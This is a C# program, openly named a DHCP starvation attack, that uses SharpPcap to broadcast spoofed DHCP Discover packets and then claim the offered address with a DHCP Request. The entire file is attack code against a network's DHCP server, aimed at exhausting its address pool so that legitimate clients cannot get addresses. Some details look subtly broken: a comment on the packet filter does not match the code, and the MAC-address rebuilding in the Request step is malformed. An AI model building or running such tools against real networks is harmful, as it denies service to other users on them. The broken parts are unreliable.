using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using SharpPcap.Npcap;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace DHCP_Starvation_Attack
{
    class Program
    {
        private static Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, System.Net.Sockets.ProtocolType.Udp);
        private static IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("192.168.178.1"), 67);
        private static ICaptureDevice device;

        //--
        private static byte[] _transactionID = new byte[4];
        private static byte[] _clientMac = new byte[6];

        static void Main(string[] args)
        {
            // Retrieve the device list
            var devices = CaptureDeviceList.Instance;

            // If no devices were found print an error
            if (devices.Count < 1)
            {
                Console.WriteLine("No devices were found on this machine");
                return;
            }

            int i = 0;

            // Print out the devices
            foreach (var dev in devices)
            {
                /* Description */
                Console.WriteLine("{0}) {1}", i, dev.Description);
                i++;
            }

            Console.WriteLine();
            Console.Write("-- Please choose a device to capture: ");
            i = int.Parse(Console.ReadLine());

            device = devices[i];

            // Open the device for capturing
            int readTimeoutMilliseconds = 1000;
            if (device is NpcapDevice)
            {
                var nPcap = device as NpcapDevice;
                nPcap.Open(SharpPcap.Npcap.OpenFlags.DataTransferUdp | SharpPcap.Npcap.OpenFlags.NoCaptureLocal, readTimeoutMilliseconds);
            }
            else if (device is LibPcapLiveDevice)
            {
                var livePcapDevice = device as LibPcapLiveDevice;
                livePcapDevice.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
            }
            else
            {
                throw new InvalidOperationException("unknown device type of " + device.GetType().ToString());
            }

            // Register our handler function to the 'packet arrival' event
            device.OnPacketArrival +=
                new PacketArrivalEventHandler(device_OnPacketArrival);

            // tcpdump filter to capture only TCP/IP packets
            string filter = "udp";
            device.Filter = filter;

            sendDHCPStarvationAttack();

            Console.Read();
        }       

        private static void sendDHCPStarvationAttack()
        {
            Random rand = new Random();
            _clientMac = PhysicalAddress.Parse("00-1C-21-3D-80-62").GetAddressBytes();
            rand.NextBytes(_transactionID);

            //--Output
            Console.WriteLine("# DHCP Discovery send...");
            buildDHCPDiscover(PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), IPAddress.Parse("255.255.255.255"));


            //--Wait for DHCP Offer
            // Start the capturing process
            device.Capture();
        }

        /// <summary>
        /// Prints the time and length of each received packet
        /// </summary>
        private static void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {   
            var packet = PacketDotNet.Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);

            var ethernetPacket = packet.Extract<PacketDotNet.EthernetPacket>();
            var udpPacket = packet.Extract<PacketDotNet.UdpPacket>();
            if (udpPacket != null)
            {                
                var ipPacket = (PacketDotNet.IPPacket)udpPacket.ParentPacket;
                System.Net.IPAddress srcIp = ipPacket.SourceAddress;
                System.Net.IPAddress dstIp = ipPacket.DestinationAddress;
                int srcPort = udpPacket.SourcePort;
                int dstPort = udpPacket.DestinationPort;

                if (srcIp.Equals(IPAddress.Parse("192.168.178.1")) & dstPort == 68)
                {
                    // Stops capture
                    device.StopCapture();

                    //--Output
                    Console.WriteLine("# DHCP Request send...");

                    buildDHCPRequest(ethernetPacket.SourceHardwareAddress, dstIp);
                }               
            }
        }   
        
        private static void buildDHCPDiscover(PhysicalAddress destinationHwAddress, IPAddress dstIP)
        {
            PhysicalAddress ethernetSourceHwAddress = PhysicalAddress.Parse("00-1C-21-3D-80-62");
            PhysicalAddress ethernetDestinationHwAddress = destinationHwAddress;

            var ethernetPacket = new EthernetPacket(ethernetSourceHwAddress,
                                                    ethernetDestinationHwAddress,
                                                    EthernetType.None);


            var ipSourceAddress = System.Net.IPAddress.Parse("0.0.0.0");
            var ipDestinationAddress = dstIP;
            var ipPacket = new IPv4Packet(ipSourceAddress, ipDestinationAddress);

            const ushort udpSourcePort = 68;
            const ushort udpDestinationPort = 67;
            var udpPacket = new UdpPacket(udpSourcePort, udpDestinationPort);

            // Now stitch all of the packets together
            DhcpDiscoveryPacket dhcpDiscoveryPacket = new DhcpDiscoveryPacket
            {
                transactionID = _transactionID,
                clientMac = _clientMac,
                clientIdentifier = _clientMac,
            };     


            //-- Combine all bytes to single byte
            byte[] payload = dhcpDiscoveryPacket.buildPacket();


            udpPacket.PayloadData = payload;
            ipPacket.PayloadPacket = udpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            device.SendPacket(ethernetPacket);
            device.SendPacket(ethernetPacket);
        }

        private static void buildDHCPRequest(PhysicalAddress destinationHwAddress, IPAddress dstIP)
        {
            PhysicalAddress ethernetSourceHwAddress = PhysicalAddress.Parse(_clientMac[0].ToString("X") + _clientMac[1].ToString("X") + _clientMac[2].ToString("X") + _clientMac[3].ToString("X") + _clientMac[4].ToString("X") + _clientMac[5].ToString("X"));
            PhysicalAddress ethernetDestinationHwAddress = destinationHwAddress;

            var ethernetPacket = new EthernetPacket(ethernetSourceHwAddress,
                                                    ethernetDestinationHwAddress,
                                                    EthernetType.None);


            var ipSourceAddress = System.Net.IPAddress.Parse("0.0.0.0");
            var ipDestinationAddress = dstIP;
            var ipPacket = new IPv4Packet(ipSourceAddress, ipDestinationAddress);

            const ushort udpSourcePort = 68;
            const ushort udpDestinationPort = 67;
            var udpPacket = new UdpPacket(udpSourcePort, udpDestinationPort);

            // Now stitch all of the packets together

            // Sends DHCP Request
            DhcpRequestPacket dhcpRequestPacket = new DhcpRequestPacket
            {
                transactionID = _transactionID,
                clientMac = _clientMac,
                clientIdentifier = _clientMac,
                requestedIP = dstIP.GetAddressBytes(),
            };

            //-- Combine all bytes to single byte
            byte[] payload = dhcpRequestPacket.buildPacket();

            udpPacket.PayloadData = payload;
            ipPacket.PayloadPacket = udpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            device.SendPacket(ethernetPacket);
        }
    }
}
